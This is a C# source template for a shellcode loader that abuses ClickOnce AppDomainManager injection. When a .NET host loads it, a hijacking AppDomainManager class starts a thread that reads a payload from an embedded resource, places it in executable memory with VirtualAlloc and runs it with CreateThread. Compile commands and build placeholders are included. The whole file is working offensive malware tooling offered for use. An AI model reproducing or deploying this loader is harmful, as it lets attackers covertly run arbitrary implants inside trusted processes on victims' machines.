/*
 * ClickOnce AppDomainManager Injection — Resource-Based Shellcode Loader
 * =====================================================================
 * Loads shellcode from an embedded assembly resource instead of a base64
 * string literal. This avoids .NET metadata heap size limits with large
 * payloads (e.g., Donut-converted Go binaries at 6MB+).
 *
 * Placeholders (replaced by build script):
 *   {CLASSNAME}     — AppDomainManager class name (must match .exe.config)
 *   {RESOURCENAME}  — Embedded resource name (default: sc.bin)
 *
 * Compile:
 *   mcs /t:library /platform:x64 /resource:sc.bin /out:Payload.dll ShellcodeLoaderResource.cs
 *   -- or --
 *   csc.exe /t:library /platform:x64 /resource:sc.bin /out:Payload.dll ShellcodeLoaderResource.cs
 */

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

public sealed class {CLASSNAME} : AppDomainManager
{
    private static int _init = 0;
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        if (Interlocked.Exchange(ref _init, 1) != 0) return;
        var t = new Thread(() =>
        {
            try
            {
                Thread.Sleep(2000);
                ResourceShellcodeRunner.Execute();
            }
            catch { }
        });
        t.IsBackground = false;
        t.Start();
    }
}

public class ResourceShellcodeRunner
{
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static bool Execute()
    {
        // Load shellcode from embedded resource — no string literal size limit
        byte[] sc;
        var asm = Assembly.GetExecutingAssembly();
        using (Stream s = asm.GetManifestResourceStream("{RESOURCENAME}"))
        {
            if (s == null) return false;
            sc = new byte[s.Length];
            s.Read(sc, 0, sc.Length);
        }

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (addr == IntPtr.Zero) return false;

        Marshal.Copy(sc, 0, addr, sc.Length);

        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero) return false;

        WaitForSingleObject(hThread, 0xFFFFFFFF);
        return true;
    }
}
